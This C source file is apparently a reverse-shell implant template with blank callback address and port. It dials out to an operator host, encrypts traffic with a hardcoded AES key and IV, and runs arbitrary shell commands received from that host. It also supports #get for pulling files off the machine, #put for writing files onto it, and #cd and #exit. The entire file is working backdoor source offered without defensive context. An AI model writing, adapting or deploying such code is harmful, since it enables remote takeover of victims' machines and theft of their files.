#include <stdio.h>
#include <stdlib.h>
#include <openssl/conf.h>
#include <openssl/evp.h>
#include <openssl/err.h>
#include <string.h>
#include <netdb.h> 
#include <netinet/in.h> 
#include <sys/socket.h> 
#include <sys/types.h> 
#include <sys/stat.h>
#include <fcntl.h>
#define MAX 2048 
#define MAX_ENC 2064
#define PORT  
#define SA struct sockaddr 

char callback_addr[] = {};
unsigned char *key = (unsigned char *)"kXMYK0nLhhqkCRwTbg5Fhvok2ANsTiWV";
unsigned char *iv = (unsigned char *)"5SmGalZA9FZJ7cij";

void handleErrors(void)
{
    ERR_print_errors_fp(stderr);
    abort();
}

int cd(char * path)
{
	return chdir(path);
}

int encrypt(unsigned char *plaintext, int plaintext_len, unsigned char *key,
            unsigned char *iv, unsigned char *ciphertext)
{
    EVP_CIPHER_CTX *ctx;

    int len;

    int ciphertext_len;

    /* Create and initialise the context */
    if(!(ctx = EVP_CIPHER_CTX_new()))
        handleErrors();

    /*
     * Initialise the encryption operation. IMPORTANT - ensure you use a key
     * and IV size appropriate for your cipher
     * In this example we are using 256 bit AES (i.e. a 256 bit key). The
     * IV size for *most* modes is the same as the block size. For AES this
     * is 128 bits
     */
    if(1 != EVP_EncryptInit_ex(ctx, EVP_aes_256_cbc(), NULL, key, iv))
        handleErrors();

    /*
     * Provide the message to be encrypted, and obtain the encrypted output.
     * EVP_EncryptUpdate can be called multiple times if necessary
     */
    if(1 != EVP_EncryptUpdate(ctx, ciphertext, &len, plaintext, plaintext_len))
        handleErrors();
    ciphertext_len = len;

    /*
     * Finalise the encryption. Further ciphertext bytes may be written at
     * this stage.
     */
    if(1 != EVP_EncryptFinal_ex(ctx, ciphertext + len, &len))
        handleErrors();
    ciphertext_len += len;

    /* Clean up */
    EVP_CIPHER_CTX_free(ctx);

    return ciphertext_len;
}

int decrypt(unsigned char *ciphertext, int ciphertext_len, unsigned char *key,
            unsigned char *iv, unsigned char *plaintext)
{
    EVP_CIPHER_CTX *ctx;

    int len;

    int plaintext_len;

    /* Create and initialise the context */
    if(!(ctx = EVP_CIPHER_CTX_new()))
        handleErrors();

    /*
     * Initialise the decryption operation. IMPORTANT - ensure you use a key
     * and IV size appropriate for your cipher
     * In this example we are using 256 bit AES (i.e. a 256 bit key). The
     * IV size for *most* modes is the same as the block size. For AES this
     * is 128 bits
     */
    if(1 != EVP_DecryptInit_ex(ctx, EVP_aes_256_cbc(), NULL, key, iv))
        handleErrors();

    /*
     * Provide the message to be decrypted, and obtain the plaintext output.
     * EVP_DecryptUpdate can be called multiple times if necessary.
     */
    if(1 != EVP_DecryptUpdate(ctx, plaintext, &len, ciphertext, ciphertext_len))
        handleErrors();
    plaintext_len = len;

    /*
     * Finalise the decryption. Further plaintext bytes may be written at
     * this stage.
     */
    if(1 != EVP_DecryptFinal_ex(ctx, plaintext + len, &len))
        handleErrors();
    plaintext_len += len;

    /* Clean up */
    EVP_CIPHER_CTX_free(ctx);

    return plaintext_len;
}

void func(int sockfd) 
{ 
    	FILE *fp;
	unsigned char buff[MAX]; 
	unsigned char enc_buff[MAX_ENC];
    	int n;
	int size;
	int count;
	char pwd_error[]= {"ERROR: could not get current working dir!"}; 
	char execute_error[] = {"Error: could not run that command!"};
	char payload_done[] = {"Payload is closing#bye"};
	char buffer_end[] = {"#BUFFEREND"};
    // infinite loop for chat 
    	for (;;) {
        	bzero(buff, MAX); 
  		bzero(enc_buff, MAX_ENC);
		fp = popen("pwd", "r");
		if (fp == NULL) {
			strcpy(buff, pwd_error);
			encrypt(buff, MAX, key, iv, enc_buff);
			write(sockfd, enc_buff, MAX_ENC);
			bzero(buff, MAX);
			bzero(enc_buff, MAX_ENC);
		}
		else{
			while (fgets(buff, 2048, fp) != NULL) {
				encrypt(buff, MAX, key, iv, enc_buff);
				write(sockfd, enc_buff, MAX_ENC);
				bzero(buff, MAX);
				bzero(enc_buff, MAX_ENC);
			}
		}
		close(fp);
		bzero(buff, MAX);
		bzero(enc_buff, MAX);
	
        // read the message from client and copy it in buffer 
        	read(sockfd, enc_buff, MAX_ENC);
		decrypt(enc_buff, MAX_ENC, key, iv, buff);
		//if #exit kill the payload
		if (strncmp("#exit", buff, 5) == 0) {
			bzero(buff, MAX);
			bzero(enc_buff, MAX_ENC);
			strcpy(buff, payload_done);
			encrypt(buff, MAX, key, iv, enc_buff);
                        write(sockfd, enc_buff, MAX_ENC); 
			break;
                }
		else if(strncmp("#DONOTHING", buff, 10) == 0)
		{
			
		}
		else if(strncmp("#cd", buff, 3) == 0)
		{
			char * dir;
			dir = strtok(buff, " ");
			dir = strtok(NULL, "\n");
			cd(dir);
			bzero(buff, MAX);
		}
		else if(strncmp("#get", buff, 4) == 0)
		{
			char * get_file;
			FILE * get_filep;
			long int get_file_length;
			char get_file_clength[50];
			char fileend[]={"#FILEEND"};
			char failed_to_open[]={"#failed to open file"};
			int count = 0;
			get_file = strtok(buff, " ");
			get_file = strtok(NULL, "\n");
			get_filep = fopen(get_file, "r");
			if(get_filep == NULL)
			{
				bzero(buff, MAX);
				bzero(enc_buff, MAX_ENC);
				strcpy(buff, failed_to_open);
				encrypt(buff, MAX, key, iv, enc_buff);
				write(sockfd, enc_buff, MAX_ENC);
			}
			else{
				fseek(get_filep, 0, SEEK_END);
				get_file_length = ftell(get_filep);
				rewind(get_filep);
				fseek(get_filep, 0, SEEK_SET);
				sprintf(get_file_clength, "%ld", get_file_length);
				bzero(buff, MAX);
				bzero(enc_buff, MAX_ENC);
				strcpy(buff, get_file_clength);
				encrypt(buff, MAX, key, iv, enc_buff);
				write(sockfd, enc_buff, MAX_ENC);
				bzero(buff, MAX);
				bzero(enc_buff, MAX_ENC);
				while(1)
				{
					usleep(1);
					if((count+MAX) < get_file_length)
					{
						fread(buff, sizeof(char), MAX, get_filep);
						encrypt(buff, MAX, key, iv, enc_buff);
						write(sockfd, enc_buff, MAX_ENC);
						bzero(buff, MAX);
						bzero(enc_buff, MAX_ENC);
						count+=MAX;
					}
					else
					{
						fread(buff, sizeof(char), (get_file_length - count), get_filep);
						encrypt(buff, MAX, key, iv, enc_buff);
						write(sockfd, enc_buff, MAX_ENC);
						bzero(buff, MAX);
						bzero(enc_buff, MAX_ENC);
						break;
					}
				}
			strcpy(buff, fileend);
			encrypt(buff, MAX, key, iv, enc_buff);
			write(sockfd, enc_buff, MAX_ENC);
			bzero(buff, MAX);
			bzero(enc_buff, MAX_ENC);
			close(get_filep);
			}
			
		} 
		else if(strncmp("#put", buff, 4) == 0)
		{
			char * filedest;
			FILE * filedestp;
			char * cfilelength;
			int count = 0;
			long int filelength; 
			filedest = strtok(buff, " ");
			filedest = strtok(NULL, " ");
			cfilelength = strtok(NULL, "\n");
			filelength = atol(cfilelength);
			filedestp = fopen(filedest, "w");
			if(filedestp == NULL)
			{
				bzero(buff, MAX);
				bzero(enc_buff, MAX_ENC);
				strcpy(buff, "#failed:Could not open file to write!\n");
				encrypt(buff, MAX, key, iv, enc_buff);
				write(sockfd, enc_buff, MAX_ENC);
			}
			else{
				bzero(buff, MAX);
				bzero(enc_buff, MAX_ENC);
				strcpy(buff, "#transfer");
				encrypt(buff, MAX, key, iv, enc_buff);
				write(sockfd, enc_buff, MAX_ENC);
				bzero(buff, MAX);
				bzero(enc_buff, MAX_ENC);
				while(1)
				{
					usleep(1);
					read(sockfd, enc_buff, MAX_ENC);	
					decrypt(enc_buff, MAX_ENC, key, iv, buff);
					if(strncmp("#FILEEND", buff, 8) == 0)
					{
						bzero(buff, MAX);
						bzero(enc_buff, MAX_ENC);
						break;
					}
					else{
						if((count + MAX) < filelength)
						{
							fwrite(buff, sizeof(char), MAX, filedestp);
							count+=MAX;
						}
						else
						{
							fwrite(buff, sizeof(char), (filelength - count), filedestp);
						}
						bzero(buff, MAX);
						bzero(enc_buff, MAX_ENC);
					}
				}
				fclose(filedestp);
			}
		}
		else{
        	// execute command from client
			char * new_buff;
			new_buff = strtok(buff, "\n");
			strcat(new_buff, " 2>&1\n");
			fp = popen(new_buff, "r");
			if (fp == NULL) {
				bzero(buff, MAX);
				bzero(enc_buff, MAX_ENC);
				strcpy(buff, execute_error);
				encrypt(buff, MAX, key, iv, enc_buff);
				write(sockfd, enc_buff, MAX_ENC);
				bzero(buff, MAX);
				bzero(enc_buff, MAX_ENC);
			}
		//if successful then send data to client
			else{
				while (fgets(buff, MAX, fp) != NULL) {
					bzero(enc_buff, MAX_ENC);
					encrypt(buff, MAX, key, iv, enc_buff);
					write(sockfd, enc_buff, MAX_ENC);
					usleep(1);
				}
			}
			close(fp);
		}
		bzero(buff, MAX);
		bzero(enc_buff, MAX_ENC);
		strcpy(buff, buffer_end);
		encrypt(buff, MAX, key, iv, enc_buff);
		write(sockfd, enc_buff, MAX_ENC);
    	} 
} 

int main()
{
	int sockfd, connfd;
        struct sockaddr_in servaddr, cli;

    // socket create and varification 
        sockfd = socket(AF_INET, SOCK_STREAM, 0);
        if (sockfd == -1) {
                exit(0);
        }
        else
        {
	}
	bzero(&servaddr, sizeof(servaddr));

    // assign IP, PORT 
        servaddr.sin_family = AF_INET;
        servaddr.sin_addr.s_addr = inet_addr(callback_addr);
        servaddr.sin_port = htons(PORT);

    // connect the client socket to server socket 
        if (connect(sockfd, (SA*)&servaddr, sizeof(servaddr)) != 0) {
                exit(0);
        }
        else
	{

	}
    // function for chat 
        func(sockfd);

    // close the socket 
         close(sockfd);
	
	return 0;


	
}


